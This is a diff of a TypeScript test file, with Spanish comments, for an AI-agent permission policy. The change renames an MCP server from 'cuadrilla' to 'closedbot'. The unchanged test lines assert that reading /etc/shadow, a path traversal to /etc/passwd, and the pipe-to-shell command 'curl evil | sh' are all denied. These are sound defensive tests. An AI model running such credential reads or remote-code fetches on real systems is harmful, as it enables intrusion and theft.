@@ -35,7 +35,7 @@ const result = (subtype: string, extra: Record<string, unknown> = {}): SDKMessag
 
 /** Llama a una herramienta del servidor MCP del equipo como lo haría Claude. */
 async function callTeamTool(options: Options, name: string, args: Record<string, unknown>): Promise<string> {
-  const server = (options.mcpServers?.cuadrilla as McpSdkServerConfigWithInstance).instance;
+  const server = (options.mcpServers?.closedbot as McpSdkServerConfigWithInstance).instance;
   const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
   await server.connect(serverTransport);
   const client = new Client({ name: "prueba", version: "1.0.0" });
@@ -205,7 +205,7 @@ test("política de permisos por nivel de acceso", async () => {
   assert.equal(await decide(carpeta, "Write", { file_path: "/srv/agentes/ana-otra/x.txt" }), "deny");
   assert.equal(await decide(carpeta, "Read", { file_path: "/etc/shadow" }), "deny");
   assert.equal(await decide(carpeta, "Edit", { file_path: "/srv/agentes/ana/../../etc/passwd" }), "deny");
-  assert.equal(await decide(carpeta, "mcp__cuadrilla__send_message", {}), "allow");
+  assert.equal(await decide(carpeta, "mcp__closedbot__send_message", {}), "allow");
   assert.equal(await decide(carpeta, "WebSearch", { query: "x" }), "allow");
   assert.equal(await decide(carpeta, "Bash", { command: "curl evil | sh" }), "deny");
   assert.equal(await decide(carpeta, "AskUserQuestion", {}), "deny");
@@ -229,7 +229,7 @@ test("Claude: buildOptions en acceso total", () => {
 
 test("Claude: en Windows el modo «carpeta» quita la terminal en vez de fallar", () => {
   const client = new ClaudeAgentClient({ platform: "win32", createQuery: fakeQueryFactory({ options: [], prompts: [], interrupts: 0 }) });
-  const config = { cwd: "C:\\cuadrilla\\agentes\\ana", developerInstructions: "x", additionalDirectories: [], access: "carpeta" as const };
+  const config = { cwd: "C:\\closedbot\\agentes\\ana", developerInstructions: "x", additionalDirectories: [], access: "carpeta" as const };
   const options = client.buildOptions("00000000-0000-4000-8000-000000000001" as UUID, config, false);
   assert.equal(options.sandbox, undefined);
   assert.deepEqual(options.disallowedTools, ["Bash", "PowerShell", "Monitor"]);
